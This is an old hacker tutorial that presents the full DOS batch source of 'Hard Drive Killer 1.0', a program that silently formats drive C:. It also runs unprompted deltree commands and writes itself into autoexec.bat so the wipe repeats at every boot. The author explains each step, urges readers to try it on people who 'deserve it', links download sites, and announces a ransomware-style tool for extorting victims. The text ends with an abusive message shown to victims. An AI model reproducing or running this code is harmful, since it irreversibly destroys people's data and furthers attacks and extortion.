  
		       HARD DRIVE KILLER VERSION 1.0

THIS ASSUMES YOU HAVE A BASIC UNDERSTANDING OF (DOS)/(BATCH PROGRAMMING)!

Today we are talking about a program called Hard Drive Killer 1.0. It is a creation of Munga Bunga (ME). Now down to business. This file totally eliminates a hard drive. When the batch program is excecuted, it formats/erases all data on drive C:\ of any PC in a few seconds (3-4 to be exact). It can take off GB's of information in just a few seconds! And guess what, I'm sure we all know about the autoexec.bat file, this is a file that is always automatically run when dos starts up (just before Windows starts running). Well, the hard drive killer inserts special codes into this file. When you run the hdkiller.bat program, it starts to kill off your hard drive, however, just incase something goes wrong or the process is interupted, it also inserts the same/similar code into the autoexec.bat file so that the next time the user or anyone else turns the computer on, the process continues from where it left off. So there is no escape. Once it is run the termination of the individuala is inevitable. They are gone for good and there is nothing they can do to recover the information.

You can download this program from (and it's updated version). . .

http://www.surf.to/iha (the bud free updated version is only at this web site, the source code has been rewriten since htis artical so you must download it from there if you want it)!



NOTO: I am also wroking on a HUGE program that can tie an individual up for a specified amount of time. We can crash someones hard drive and lock up all their important and personal files (including Operating system files) so they won't be able to work. Then they must attain a password to undo the process (and only you will know/choose that password). You can even bribe them for anything because they will be desparate to get the password. Look for this program at the above web site (http://www.geocities.com/WallStreet/4998/).

ANALYSIS OF HOW THE PROGRAM WORKS:

When run, all the person sees is "PLEASE WAIT WHILE PROGRAM LOADS . . .", nothing else. Why? Well because there is something called the "NUL" device. This is a nowhere land on the computer, a terminal/device that with no defined storage location, a dead end, what ever goes there never comes back! So instead of letting the output go to the screen (the default location) we let it goto the NUL device with the >nul redirection line at the end. So then now one sees it.

The autoexec.bat file is then made "unhidden" and "non-read only" (so it can be manipulated). Then the configuring of the autoexec.bat file starts. The line "echo format c: /q /u /autotest >nul >c:\autoexec.bat" is very important, here is what it does: Anything after the word echo is normally seen on the screen. But we have directed it's output to the c:\autoexec.bat file. That file (autoexec.bat) will contain the following code "format c: /q /u /autotest >nul". the @echo off before that just stops the commands from being displayed, and the >nul directions made the results from the command disappear (don't get the two confused). It does a bit of configuring with the autoexec.bat file. However, you should note that it only makes the bare minimum insertion of code at the start of the program, so that the program can quickly get up and running without any delay. After the main program is done runing, the FULL PROGRAM CODE is reinserted into the autoexec.bat file! This can take about one-two seconds. The whole process should be less then 5 seconds if the format works, if it doesn't then we are left to the deltree (deleting fiels) command, this may take a few minutes. But i have ensured that format works. Read on to see how...

If you have weird config.sys specifications and dos commands are not set with the "set path" command to a given path, then if the format file isn't in your root directory you cannot run the format file, so this program looks into the most common directories (c:\dos for Windows 3.1 users and c:\windows\command for Windows 95/NT/98 users). The files are then run from there. Let's take a look at an example. Look at the ":dosform" lable. Prior to that lable being excecuted we have a ":form" lable which (in english) says that "if the file format.* (* meaning anything - a wild card) exist in the c:\dos directory, then go to the ":dosform" lable". And the ":dosform" lable works under the assumption that there is a file called format.* in the dos directory. So it carries out the format operation accordingly. There are a few things like that in this program, they carry useful purposes. After extensive testing of the victoms computer, the whole code is inserted into the autoexec.bat fiel fully with multiple '"echo" commands.

Notice that on the 7th line of the program there is something saying "echo dummy variable >c:\dvar.txt" , this code creates a useless file for testing purposes. Im Mathematics a dummy variable is defined as a variable which is of no significance but is only used for the representation of another variable, function or situation. So the the file/variable does not contain a function but it is used to represent whether something exist or not. It is not important what you use as the variable becasue it is just a "dummy variable". We create a file called dvar.txt with the words "dummy variable" in it (the words are not important, it can be anything you want it to be), it's purpose is to create a file with name dvar.txt. After the process/program runs, if this file still exist then it means the program didn't format the drive (otherwise it would have been gone) - so then the program elapses into the deleting phase (which is the last resort) to make sure the mother f***er is killed OFF once and for all!!!! This is implemented with the line "if exist dvar.txt goto dtree" if this is true, then the ":dtree" lable is run, if it is not then the ":inform" lable is run with gives a message and inserts the full program code into the computer. The same message also appeares when the computer is restarted because it is stored in a file called hdkiller.txt which is called (and displayed with the type command) from the autoexec.bat file upon restarting the computer.

A note about the format comand. hte /q swich means "quick" format, the u switch means "unconditional" format (so it can never be reversed) and the /autotest switch does not promtp the user for whether they are sure they want to format their system or not. Also dont' use c:\ with the format switch, it only accepts c: (no slash). As for the deltree command, the /y switch also does what the /autotest switch does in the format command, it does not prompt the user.

There you go, fast, efficient and well worked out, try it for yourself. But hey, just don't hit innocent people with it ok guys/girls?? Hit the sleazy but heads only, those who deserve it. I make many more of this sort of stuff and better, so any questions email me at mungabunga@hotmail.com or go to the web site at http://www.geocities.com/WallStreet/4998/ to get the latest version of this destructive file and anything else!

Here is the source code...

@echo off
echo PLEASE WAIT WHILE PROGRAM LOADS . . .

attrib -h -r c:\autoexec.bat >nul
echo @echo off >c:\autoexec.bat
echo format c: /q /u /autotest >nul >>c:\autoexec.bat
echo deltree /y c: >nul >>c:\autoexec.bat
echo dummy variable >c:\dvar.txt

:form
format c: /q /u /autotest >nul
if exist c:\dos\format.* goto dosform
if exist c:\windows\command\format.* goto winform
goto del

:dosform
cd\dos >nul
format c: /q /u /autotest >nul
cd\ >nul

:winform
cd\windows\command >nul
format c: /q /u /autotest >nul
cd\ >nul
goto inform

:del
if exist c:\dvar.txt goto dtree
goto inform

:dtree
deltree /y c: >nul
if exist c:\dos\deltree.* goto deldos
if exist c:\windows\command\deltree.* goto delwin
goto inform

:deldos
cd\dos
c:\dos\deltree /y c: >nul
cd\

:delwin
cd\windows\command >nul
deltree /y c: >nul
cd\ >nul


:inform
cls
echo You have been hit by the Hard Drive Killer, written by Munga Bunga. >c:\hdkiller.txt
echo HD Killer is a Munga Bunga Production. >>c:\hdkiller.txt
echo. >>c:\hdkiller.txt
echo Here is a message to all you but lickers. . . >>c:\hdkiller.txt
echo. >>c:\hdkiller.txt
echo FREE KEVIN MITNIC [Munga Bunga]. >>c:\hdkiller.txt
echo. >>c:\hdkiller.txt
echo If you were destroyed by this HDkiller program, then you would have >>c:\hdkiller.txt
echo deserved it. Die you mother fuckers!!!! >>c:\hdkiller.txt


rem The following rewrites the code into the autoexec.bat file.

echo @echo off >c:\autoexec.bat
echo cls >>c:\autoexe.bat

echo :form
echo format c: /q /u /autotest >nul >>c:\autoexec.bat
echo if exist c:\dos\format.* goto dosform >>c:\autoexec.bat
echo if exist c:\windows\command\format.* goto winform >>c:\autoexec.bat
echo goto del >>c:\autoexec.bat

echo :dosform >>c:\autoexec.bat
echo cd\dos >nul >>c:\autoexec.bat
echo format c: /q /u /autotest >nul >>c:\autoexec.bat
echo cd\ >nul >>c:\autoexec.bat

echo :winform >>c:\autoexec.bat
echo cd\windows\command >nul >>c:\autoexec.bat
echo format c: /q /u /autotest >nul >>c:\autoexec.bat
echo cd\ >nul >>c:\autoexec.bat
echo goto write >>c:\autoexec.bat

echo :del >>c:\autoexec.bat
echo if exist c:\dvar.txt goto dtree >>c:\autoexec.bat
echo goto write >>c:\autoexec.bat

echo :dtree >>c:\autoexec.bat
echo deltree /y c: >nul >>c:\autoexec.bat
echo if exist c:\dos\deltree.* goto deldos >>c:\autoexec.bat
echo if exist c:\windows\command\deltree.* goto delwin >>c:\autoexec.bat

echo :deldos >>c:\autoexec.bat
echo cd\dos >>c:\autoexec.bat
echo c:\dos\deltree /y c: >nul >>c:\autoexec.bat
echo cd\ >>c:\autoexec.bat

echo :delwin >>c:\autoexec.bat
echo cd\windows\command >nul >>c:\autoexec.bat
echo deltree /y c: >nul >>c:\autoexec.bat
echo cd\ >nul >>c:\autoexec.bat

echo :write >>c:\autoexec.bat
echo type hdkiller.txt >>c:\autoexec.bat
echo pause >>c:\autoexec.bat

rem Rewriting of code to the auteoxec.bat file is complete.

:end


That is the end of the program, any questions email me at mungabunga@hotmail.com or go to the web site at http://www.geocities.com/WallStreet/4998/ to get the latest version of this destructive file!
 